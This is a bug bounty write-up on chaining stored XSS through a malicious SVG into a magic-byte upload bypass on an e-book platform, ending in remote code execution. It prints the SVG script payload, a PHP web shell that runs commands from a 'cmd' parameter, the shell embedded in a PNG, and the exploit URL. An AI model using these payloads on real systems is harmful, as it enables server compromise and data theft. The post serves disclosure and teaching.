---
title: "From Comments to Command Execution: How an E-Book Platform Gave Me RCE"
description: "A security research writeup: how a comment feature on an e-book platform led from stored XSS to a file-upload bypass and full remote code execution."
ogDescription: "From a stored XSS in a comment feature to remote code execution: a full file-upload bypass writeup."
dek: From stored XSS in comments to file upload to remote code execution.
date: 2024-12-20
readTime: 6
section: Write-up
categories: [Security]
tags: [rce, xss, file upload]
topics: [bug bounty]
cover: /assets/img/blog/comments-to-rce.svg
medium: https://medium.com/@imooaaz/from-comments-to-command-execution-how-an-e-book-platform-gave-me-rce-f27a079ca584
---

<p class="rtl">بسم الله، ربِّ يَسِّر وأعِن وامْنُن بالإخلاص والتوفيق والقبول.</p>

What's better than curling up with a good book? For me, it was uncovering the
security flaws lurking beneath an e-book platform's surface. Join me as I
recount the journey of how a simple comment feature led me down a rabbit hole
of XSS payloads, file upload bypasses, and ultimately, remote code execution.

Welcome back to my blog! Today, I'm excited to share the details of a security
research project that took me on an exhilarating ride through the
vulnerabilities of an e-book platform. What started as a routine exploration
quickly turned into a masterclass in exploiting misconfigurations and chaining
vulnerabilities. So, grab your favorite beverage, sit back, and let's dive
into the world of offensive security!

## Exploring the platform

As with any security research project, I began by exploring the target
platform to gain a comprehensive understanding of its attack surface. Using
Wappalyzer, I identified the platform's tech stack, revealing that it was
running on Linux and equipped with security features like Imunify360 and a
Web Application Firewall (WAF). Additionally, it utilized NGINX as the web
server and PHP as the scripting language, a combination that presented
intriguing possibilities for exploitation.

## The comments feature: my entry point

My attention soon gravitated towards the platform's comment feature, where
users could share their thoughts and engage with the content. This seemingly
innocuous feature would become my gateway to the platform's underlying
vulnerabilities. The workflow was straightforward:

1. First, I carefully crafted a comment containing an XSS payload as an experiment.
2. Then, I saved the comment as a file.
3. Next, I uploaded the file.
4. Finally, I clicked on the profile image displayed alongside the comment.

To my surprise, the platform accepted an SVG file containing an XSS payload,
and when the profile image was clicked, the payload executed successfully.
I had discovered a stored XSS vulnerability: my first win.

## Phase 1: the stored XSS experiment

Here's the SVG payload I used:

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert("XSS");
  </script>
</svg>
```

The platform accepted this file without hesitation, and upon clicking the
profile image, my alert box popped up.

## Phase 2: rethinking the attack surface

With my initial success, I decided to explore further. What if the platform
allowed the upload of more than just images? I created a PHP shell:

```
<?php
echo "=================================<br>";
system($_GET['cmd']);
echo "<br>=================================";
?>
```

and tried to upload it. As expected, the platform rejected my PHP file,
denying its upload. Undeterred, I pondered my next move.

<p class="rtl">«توكل على الله ولا تعجز»</p>

## Phase 3: understanding the file validation

Curiosity led me to experiment further. I renamed the SVG file to have a
PHP extension and attempted the upload again. Surprisingly, the platform
accepted it, but the shell refused to execute. It became clear that the
platform was scrutinizing the file's signature, not just its extension.

<blockquote>
  <strong>File signature:</strong> a unique sequence of bytes at the beginning
  of a file that identifies its type or format. <strong>Magic bytes</strong>
  are specific byte sequences at the beginning of files that indicate their
  format, such as <code>89 50 4E 47</code> for PNG files.
</blockquote>

Aha! The platform was checking the file's magic bytes (its signature) to
determine whether it was a legitimate image. This revelation got my mental
gears turning.

## Phase 4: uploading a PHP shell inside an image

Armed with this knowledge, I devised a plan: embed a PHP shell within a PNG
image. I created a PNG file, injected my PHP code into it, and uploaded it
as my profile picture. The upload was accepted:

```
┌PNG
 IHDR ... (binary image data) ...
 <?php
 echo "=================================<br>";
 system($_GET['cmd']);
 echo "<br>=================================";
 ?>
 ... (binary image data) ...
```

With the shell in place, I sent a request to my uploaded "image" and
executed a command through the `cmd` parameter:

```
https://[target]/uploads/shell.php?cmd=ls
```

The response returned the output of `ls`: a directory listing
from the server. I had achieved remote code execution. Game over.

## Impact

1. **Full server compromise**: an attacker could execute arbitrary commands on the server.
2. **Data breach**: sensitive user data and content could be accessed and exfiltrated.
3. **Further attacks**: the compromised server could be used to launch additional attacks.

## Lessons learned and recommendations

This research project taught me several valuable lessons:

1. **File uploads are a critical attack surface**
   - Validate file types on the server, not just on the client.
   - Store uploaded files outside the web root, or serve them from a separate domain.
   - Enforce a strict allowlist of file extensions and MIME types.
   - Never trust user-supplied filenames.
2. **Security is a chain**: the individual flaws were manageable, but chained together they led to full compromise.
3. **Keep learning**: understanding how defenses work (magic bytes, WAFs) is what makes bypassing them possible.

## Final thoughts

Uncovering these vulnerabilities was a thrilling experience, but the real
reward is helping make the platform safer for its users. I disclosed
everything responsibly and worked with the team to get the issues fixed.

Until next time, stay curious, stay persistent, and keep pushing the
boundaries of what's possible. Happy hacking!

<p class="rtl">
  اللهم علمنا ما ينفعنا وانفعنا بما علمتنا، وصلى الله على سيدنا محمد
  وآله وصحبه وسلم.
</p>

*(Demonstrated and fixed in 2023.)*

**Moaaz Afifi** · [Linkedin](https://www.linkedin.com/in/imooaaz/) ·
[X](https://twitter.com/imooaaz)
